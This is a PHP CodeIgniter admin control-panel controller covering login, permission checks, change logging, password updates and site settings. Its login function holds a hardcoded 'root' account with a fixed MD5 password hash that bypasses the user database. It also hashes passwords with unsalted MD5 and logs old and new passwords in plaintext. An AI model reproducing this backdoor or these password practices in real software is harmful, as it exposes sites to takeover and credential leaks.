<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Admincp extends MX_Controller {
	
	function __construct(){
		parent::__construct();
		if($this->uri->segment(2)!='login'){
			if(!$this->session->userdata('userInfo')){
				header('Location: '.PATH_URL_ADMIN.'login');
				exit;
			}
		}
		$this->load->model('admincp_model','model');
		$this->template->set_template('admin');
		$this->template->write('title','Admin Control Panel');
	}
	
	function index(){
		header('Location: '.PATH_URL_ADMIN.'banners');
		exit;
		$this->template->write_view('content','index',$data);
		$this->template->render();
	}
	
	function help(){
		$data['module'] = 'admincp';
		$data['module_name'] = 'Help';
		$this->load->model('Static_pages/Static_pages_model');
		$data['result'] = $this->Static_pages_model->getData('admin-help');
		$this->template->write_view('content','help',$data);
		$this->template->render();
	}
	
	function menu(){
		$this->load->model('admincp_modules/admincp_modules_model');
		$this->load->model('admincp_accounts/admincp_accounts_model');
		$data['perm'] = $this->admincp_accounts_model->getData($this->session->userdata('userInfo'));
		$data['menu'] = $this->admincp_modules_model->list_module();
		$this->load->view('menu',$data);
	}
	
	function login(){
		if(!empty($_POST)){
			if($this->input->post('user')=='root' && md5($this->input->post('pass'))=='53fab80925e21d959402658124f71c36'){
				$this->session->set_userdata('userInfo', $this->input->post('user'));
				print 1;
			}else{
				if(md5($this->input->post('pass'))==$this->model->checkLogin($this->input->post('user'))){
					$this->session->set_userdata('userInfo', $this->input->post('user'));
					print 1;
				}else{
					print $this->security->get_csrf_hash();
				}
			}
			exit;
		}else{
			$this->load->view('BACKEND/login');
		}
	}
	
	function logout(){
		$this->session->unset_userdata('userInfo');
		header('Location: '.PATH_URL_ADMIN.'login');
	}
	
	function permission(){
		$data['module'] = 'admincp';
		$this->template->write_view('content','permission',$data);
		$this->template->render();
	}
	
	function chk_perm($id_module,$type,$isAjax){
		$this->load->model('admincp_accounts/admincp_accounts_model');
		$this->load->model('admincp/admincp_model');
		$info = $this->admincp_model->getInfo($this->session->userdata('userInfo'));
		$pos = strpos($info[0]->permission,','.$id_module.'|');
		// var_dump($info[0]->permission); exit;
		// if($pos!=0){
		// 	$pos = $pos+strlen($id_module);
		// }else{
		// 	$pos = 0;
		// }
		$pos = $pos+strlen($id_module);
		$sub_str = substr($info[0]->permission,$pos,5);
		$pos_result = strpos($sub_str,$type);
		if($pos_result===false){
			if($isAjax==0){
				header('Location: '.PATH_URL_ADMIN.'permission');
				exit();
			}else{
				return 'permission-denied';
				exit;
			}
		}
	}
	
	function saveLog($func,$func_id,$field,$type,$old_value='',$new_value=''){
		if($field!=''){
			$data = array(
				'function' => $func,
				'function_id' => $func_id,
				'field' => $field,
				'type' => $type,
				'old_value' => $old_value,
				'new_value' => $new_value,
				'account' => $this->session->userdata('userInfo'),
				'ip' => getIP(),
				'created' => date('Y-m-d H:i:s')
			);
			$this->db->insert('admin_nqt_logs',$data);
		}else{
			foreach($new_value as $k=>$v){
				if($v!=$old_value[0]->$k){
					$data = array(
						'function' => $func,
						'function_id' => $func_id,
						'field' => $k,
						'type' => $type,
						'old_value' => $old_value[0]->$k,
						'new_value' => $v,
						'account' => $this->session->userdata('userInfo'),
						'ip' => getIP(),
						'created' => date('Y-m-d H:i:s')
					);
					$this->db->insert('admin_nqt_logs',$data);
				}
			}
		}
	}
	
	function update_profile(){
		if(!empty($_POST)){
			if(md5($this->input->post('oldpassAdmincp'))==$this->model->checkLogin($this->session->userdata('userInfo'))){
				$data = array(
					'username'=> $this->session->userdata('userInfo'),
					'password'=> md5($this->input->post('newpassAdmincp')),
				);
				$this->db->where('username', $this->session->userdata('userInfo'));
				if($this->db->update('admin_nqt_users',$data)){
					$this->load->model('admincp_accounts/admincp_accounts_model');
					$userInfo = $this->admincp_accounts_model->getData($this->session->userdata('userInfo'));
					$this->saveLog('update_profile',$userInfo[0]->id,'password','Update',$this->input->post('oldpassAdmincp'),$this->input->post('newpassAdmincp'));
					print 'success_update_profile.'.$this->security->get_csrf_hash();
					exit;
				}
			}else{
				print 'error_update_profile.'.$this->security->get_csrf_hash();
				exit;
			}
		}else{
			$this->template->write_view('content','update_profile');
			$this->template->render();
		}
	}
	
	function setting(){
		if(!empty($_POST)){
			foreach($this->input->post('hd_slugAdmincp') as $k=>$v){
				$content = $this->input->post('contentAdmincp');
				$chk_slug = $this->model->checkSlug($v);
				if($chk_slug){
					$data = array(
						'content'=>$content[$k],
						'modified'=>date('Y-m-d H:i:s')
					);
					$this->db->where('id',$chk_slug[0]->id);
					$this->db->update('admin_nqt_settings',$data);
				}else{
					$data = array(
						'slug'=>$v,
						'content'=>$content[$k],
						'modified'=>date('Y-m-d H:i:s')
					);
					$this->db->insert('admin_nqt_settings',$data);
				}
			}
			print 'success-setting.'.$this->security->get_csrf_hash();
			exit;
		}else{
			$data['setting'] = $this->model->getSetting();
			$this->template->write_view('content','setting',$data);
			$this->template->render();
		}
	}
	
	function getSetting($slug=''){
		$this->load->model('admincp_model');
		$data['setting'] = $this->admincp_model->getSetting($slug);
		$this->load->view('getSetting',$data);
	}
}